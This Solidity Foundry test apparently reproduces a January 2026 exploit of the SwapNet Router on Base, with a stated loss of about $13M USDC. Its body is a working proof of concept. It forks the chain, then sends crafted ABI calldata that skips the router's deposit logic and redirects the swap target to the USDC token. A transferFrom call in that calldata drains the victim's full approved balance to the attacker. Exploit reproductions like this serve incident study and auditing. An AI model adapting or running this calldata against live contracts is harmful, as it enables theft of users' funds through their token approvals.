// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "src/shared/BaseTest.sol";
import "src/shared/interfaces.sol";

/*
@Protocol: SwapNet (Matcha Meta)
@Date: 2026-01-25
@Attacker: 0x6cAad74121bF602e71386505A4687f310e0D833e
@Target: SwapNet Router (0x616000e384Ef1C2B52f5f3A88D57a3B64F23757e)
@TxHash: 0xc15df1d131e98d24aa0f107a67e33e66cf2ea27903338cc437a3665b6404dd57
@ChainId: 8453 (Base)
@Loss: ~$13M USDC
*/

contract SwapNetTest is BaseTest {
    address constant ROUTER = 0x616000e384Ef1C2B52f5f3A88D57a3B64F23757e;
    address constant USDC_ADDR = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address constant VICTIM = 0xba15E9b644685cB845aF18a738Abd40C6Bcd78eD;
    address constant ATTACKER = 0x6cAad74121bF602e71386505A4687f310e0D833e;

    function setUp() public {
        vm.createSelectFork("base", 41289840);
        target = ROUTER;

        vm.label(ROUTER, "SwapNet_Router");
        vm.label(USDC_ADDR, "USDC");
        vm.label(VICTIM, "Victim");
        vm.label(ATTACKER, "Attacker");
    }

    function testExploit() public balanceLog {
        uint256 allowance = IERC20(USDC_ADDR).allowance(VICTIM, ROUTER);
        console.log("Victim Allowance to Router:", allowance);

        uint256 victimBalanceBefore = IERC20(USDC_ADDR).balanceOf(VICTIM);
        console.log("Victim USDC Balance (Before):", victimBalanceBefore);

        uint256 attackerBalanceBefore = IERC20(USDC_ADDR).balanceOf(ATTACKER);
        uint256 amountToSteal = victimBalanceBefore;

        // ═══════════════════════════════════════════════════════════════════
        // EXPLOIT: Precision ABI Manipulation
        // ═══════════════════════════════════════════════════════════════════
        // Strategy: Mimic legitimate swap structure, swap execution target
        //
        // Phase 1 (varg0): Boot router engine without depositing funds
        // Phase 2 (varg1): Redirect execution target from DEX pool → USDC
        // Phase 3 (payload): Abuse Router's approval via transferFrom
        // ═══════════════════════════════════════════════════════════════════

        bytes memory exploitData = abi.encodePacked(
            bytes4(0x87395540), // Function selector
            abi.encode(uint256(0x80)), // varg0 offset
            abi.encode(uint256(0x160)), // varg1 offset
            abi.encode(uint256(0)), // varg2
            abi.encode(uint256(0)), // varg3
            // ─────────────────────────────────────────────────────────────
            // Phase 1: Router Engine Boot (Bypass Deposit Logic)
            // ─────────────────────────────────────────────────────────────
            abi.encode(uint256(2)), // iterator = 2 (pass loop check)
            abi.encode(address(0xc5fecC3a29Fb57B5024eEc8a2239d4621e111CBE)), // dummy token
            abi.encode(uint256(0)), // amount = 0 (skip deposit!)
            abi.encode(uint256(0)), // flags
            abi.encode(address(0xc5fecC3a29Fb57B5024eEc8a2239d4621e111CBE)), // padding (ABI compliance)
            abi.encode(uint256(0)),
            abi.encode(uint256(1)),
            abi.encode(uint256(1)),
            // ─────────────────────────────────────────────────────────────
            // Phase 2: Target Swap (No Whitelist Validation!)
            // ─────────────────────────────────────────────────────────────
            abi.encode(uint256(0x20)),
            abi.encode(uint256(0)),
            abi.encode(uint256(0)),
            abi.encode(address(USDC_ADDR)), // target = USDC (should be pool!)
            abi.encode(uint256(0x1c)),
            abi.encode(uint256(0xa0)),
            abi.encode(uint256(0x64)),
            // ─────────────────────────────────────────────────────────────
            // Phase 3: Privilege Escalation (Approval Abuse)
            // ─────────────────────────────────────────────────────────────
            bytes4(0x23b872dd), // transferFrom selector
            abi.encode(address(VICTIM)), // from: victim (has approved Router)
            abi.encode(address(ATTACKER)), // to: attacker
            abi.encode(amountToSteal) // amount: victim's balance
        );

        (bool success,) = target.call(exploitData);
        require(success, "Exploit execution failed");

        uint256 victimBalanceAfter = IERC20(USDC_ADDR).balanceOf(VICTIM);
        uint256 attackerBalanceAfter = IERC20(USDC_ADDR).balanceOf(ATTACKER);

        console.log("Victim USDC Balance (After):", victimBalanceAfter);
        console.log("Attacker USDC Balance (After):", attackerBalanceAfter);
        console.log("Stolen Amount:", attackerBalanceAfter - attackerBalanceBefore);

        require(victimBalanceAfter == 0, "Attack failed: Victim still has money");
        require(
            attackerBalanceAfter - attackerBalanceBefore == amountToSteal, "Attack failed: Stolen amount mismatch"
        );
    }
}
